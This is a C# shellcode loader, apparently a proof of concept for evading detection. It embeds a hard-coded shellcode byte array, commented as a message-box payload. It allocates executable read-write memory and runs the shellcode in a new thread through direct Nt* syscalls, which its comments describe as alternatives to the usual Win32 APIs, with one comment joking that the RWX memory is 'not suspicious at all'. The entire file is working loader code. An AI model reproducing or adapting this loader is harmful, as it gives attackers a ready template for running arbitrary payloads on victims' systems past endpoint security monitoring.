using System;
using System.Runtime.InteropServices;
using static Syscall.Native;
using static Syscall.Syscalls;

namespace Syscall
{
    class Program
    {
        static void Main()
        {
            /*   Messagebox shellcode   */
            byte[] payload = new byte[] { 0x48,0x31,0xff,0x48,0xf7,0xe7,0x65,0x48,0x8b,0x58,0x60,0x48,0x8b,0x5b,0x18,0x48,0x8b,0x5b,0x20,0x48,0x8b,0x1b,0x48,0x8b,0x1b,0x48,0x8b,0x5b,0x20,0x49,0x89,0xd8,0x8b
,0x5b,0x3c,0x4c,0x01,0xc3,0x48,0x31,0xc9,0x66,0x81,0xc1,0xff,0x88,0x48,0xc1,0xe9,0x08,0x8b,0x14,0x0b,0x4c,0x01,0xc2,0x4d,0x31,0xd2,0x44,0x8b,0x52,0x1c,0x4d,0x01,0xc2
,0x4d,0x31,0xdb,0x44,0x8b,0x5a,0x20,0x4d,0x01,0xc3,0x4d,0x31,0xe4,0x44,0x8b,0x62,0x24,0x4d,0x01,0xc4,0xeb,0x32,0x5b,0x59,0x48,0x31,0xc0,0x48,0x89,0xe2,0x51,0x48,0x8b
,0x0c,0x24,0x48,0x31,0xff,0x41,0x8b,0x3c,0x83,0x4c,0x01,0xc7,0x48,0x89,0xd6,0xf3,0xa6,0x74,0x05,0x48,0xff,0xc0,0xeb,0xe6,0x59,0x66,0x41,0x8b,0x04,0x44,0x41,0x8b,0x04
,0x82,0x4c,0x01,0xc0,0x53,0xc3,0x48,0x31,0xc9,0x80,0xc1,0x07,0x48,0xb8,0x0f,0xa8,0x96,0x91,0xba,0x87,0x9a,0x9c,0x48,0xf7,0xd0,0x48,0xc1,0xe8,0x08,0x50,0x51,0xe8,0xb0
,0xff,0xff,0xff,0x49,0x89,0xc6,0x48,0x31,0xc9,0x48,0xf7,0xe1,0x50,0x48,0xb8,0x9c,0x9e,0x93,0x9c,0xd1,0x9a,0x87,0x9a,0x48,0xf7,0xd0,0x50,0x48,0x89,0xe1,0x48,0xff,0xc2
,0x48,0x83,0xec,0x20,0x41,0xff,0xd6 };

            IntPtr hCurrentProcess = GetCurrentProcess();
            IntPtr pMemoryAllocation = new IntPtr(); // needs to be passed as ref
            IntPtr pZeroBits = IntPtr.Zero;
            UIntPtr pAllocationSize = new UIntPtr(Convert.ToUInt32(payload.Length)); // needs to be passed as ref
            uint allocationType = (uint)Native.AllocationType.Commit | (uint)Native.AllocationType.Reserve; // reserve and commit memory
            uint protection = (uint) Native.AllocationProtect.PAGE_EXECUTE_READWRITE; // set the memory protection to RWX, not suspicious at all...

            /*   Allocate memory for shellcode via syscall (alternative to VirtualAlloc Win32 API)   */
            try
            {
                var ntAllocResult = NtAllocateVirtualMemory(hCurrentProcess, ref pMemoryAllocation, pZeroBits, ref pAllocationSize, allocationType, protection);
                Console.WriteLine($"[*] Result of NtAllocateVirtualMemory is {ntAllocResult}");
                Console.WriteLine("[*] Address of memory allocation is " + string.Format("{0:X}", pMemoryAllocation));
            }
            catch
            {
                Console.WriteLine("[*] NtAllocateVirtualMemory failed.");
                Environment.Exit(1);
            }

            /*   Copy shellcode to memory allocated by NtAllocateVirtualMemory   */
            try
            {
                Marshal.Copy(payload, 0, (IntPtr)(pMemoryAllocation), payload.Length);
            }
            catch 
            { 
                Console.WriteLine("[*] Marshal.Copy failed!"); 
                Environment.Exit(1); 
            }

            IntPtr hThread = new IntPtr(0);
            ACCESS_MASK desiredAccess = ACCESS_MASK.SPECIFIC_RIGHTS_ALL | ACCESS_MASK.STANDARD_RIGHTS_ALL; // logical OR the access rights together
            IntPtr pObjectAttributes = new IntPtr(0);
            IntPtr lpParameter = new IntPtr(0);
            bool bCreateSuspended = false;
            uint stackZeroBits = 0;
            uint sizeOfStackCommit = 0xFFFF;
            uint sizeOfStackReserve = 0xFFFF;
            IntPtr pBytesBuffer = new IntPtr(0);

            /*   Create a new thread to run the shellcode (alternative to CreateThread Win32 API)   */
            try
            {
                var hThreadResult = NtCreateThreadEx(out hThread, desiredAccess, pObjectAttributes, hCurrentProcess, pMemoryAllocation, lpParameter, bCreateSuspended, stackZeroBits, sizeOfStackCommit, sizeOfStackReserve, pBytesBuffer);
                Console.WriteLine($"[*] Result of NtCreateThreadEx is {hThreadResult}");
                Console.WriteLine($"[*] Thread handle returned is {hThread}");
            }
            catch
            {
                Console.WriteLine("[*] NtCreateThread failed.");
            }

            /*   Wait for the thread to start (alternative to WaitForSingleObject Win32 API)   */

            try
            {
                var result = NtWaitForSingleObject(hThread, true, 0); // alertable or not alertable, no change...
                Console.WriteLine($"[*] Result of NtWaitForSingleObject is {result}");
            }
            catch
            {
                Console.WriteLine("[*] NtWaitForSingleObject failed.");
                Environment.Exit(1);
            }

            return;
        }
    }
}
